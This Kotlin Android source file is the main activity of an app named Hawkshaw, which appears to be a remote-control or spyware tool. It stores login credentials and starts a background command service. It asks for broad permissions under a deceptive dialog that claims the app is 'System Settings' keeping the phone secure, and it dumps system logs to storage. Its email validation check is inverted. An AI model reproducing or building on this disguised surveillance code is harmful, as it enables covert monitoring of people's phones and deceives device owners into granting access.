package me.hawkshaw.activities

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.util.Log
import android.util.Patterns
import android.widget.Toast
import kotlinx.android.synthetic.main.activity_main.*
import me.hawkshaw.R
import me.hawkshaw.services.CommandService
import me.hawkshaw.utils.Constants
import java.io.File


class MainActivity : Activity() {

    private val prefs by lazy { this.getSharedPreferences("com.android.hawkshaw", Context.MODE_PRIVATE) }
    private val permissionRationale = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dumpLogs()
        text_instruction.text = "Enter your email and password and remember to login on website."
        if (prefs.getString("email", "null").equals("null", true)) login()
        else start()
    }

    @SuppressLint("ApplySharedPref")
    private fun login() {
        btn_login.setOnClickListener {
            val email: String = et_email.text.toString()
            val password: String = et_password.text.toString()
            if (Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
                Toast.makeText(this, "Enter valid email address ! ! !", Toast.LENGTH_SHORT).show()
            } else if (password.length < 8) {
                Toast.makeText(this, "Password too short ! ! !", Toast.LENGTH_SHORT).show()
            } else {
                prefs.edit().putString("email", email).commit()
                prefs.edit().putString("password", password).commit()
                start()
            }
        }
    }

    private fun start() {
        if (hasPermissions()) {
            startService(Intent(this, CommandService::class.java))
            finish()
        } else requestPermissions()
    }

    private fun requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            var k = 0
            for (i in Constants.PERMISSIONS) if (ActivityCompat.shouldShowRequestPermissionRationale(this, i)) k++
            if (k > 0) showPermissionRationale()
            else ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 999)
        }
    }

    private fun hasPermissions(): Boolean {
        for (permission in Constants.PERMISSIONS)
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) return false
        return true
    }

    private fun showPermissionRationale() {
        AlertDialog.Builder(this).setIcon(R.mipmap.ic_launcher).setTitle("Permission Required")
                .setMessage(permissionRationale)
                .setPositiveButton("OK") { dialog, _ ->
                    dialog.dismiss()
                    ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 999)
                }
                .setNegativeButton("Cancel") { dialog, _ ->
                    dialog.dismiss()
                }
                .create().show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        start()
    }

    private fun dumpLogs() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                val appDirectory = File(Environment.DIRECTORY_PICTURES + "/Hawkshaw")
                val logFile = File(appDirectory, "logcat" + System.currentTimeMillis() + ".txt")
                if (!appDirectory.exists()) appDirectory.mkdir()
                val process = Runtime.getRuntime().exec("logcat -f $logFile")
                Log.d("suthar", "dumpLogs" + logFile.path)
            }
        }
    }
}
